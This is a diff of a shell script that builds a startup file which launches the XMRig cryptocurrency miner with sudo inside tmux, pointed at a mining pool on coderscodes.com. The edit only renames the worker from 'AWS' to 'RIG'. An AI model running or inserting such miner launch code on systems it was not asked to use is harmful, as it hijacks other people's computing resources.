@@ -11,7 +11,7 @@ echo "#!/bin/sh">st.sh
 echo "cd $HOME/">>st.sh
 echo "tmux kill-server">>st.sh
 echo "sleep 1">>st.sh
-echo "tmux new-session -d -s main 'sudo ./xmrig -o coderscodes.com:3333 -u AWS -k -o coderscodes.com:3333 -u AWS -t nullt --donate-level=0 --randomx-1gb-pages'">>st.sh
+echo "tmux new-session -d -s main 'sudo ./xmrig -o coderscodes.com:3333 -u RIG -k -o coderscodes.com:3333 -u RIG -t nullt --donate-level=0 --randomx-1gb-pages'">>st.sh
 time=$(date +%s)
 user=lino
 threads=$(nproc)
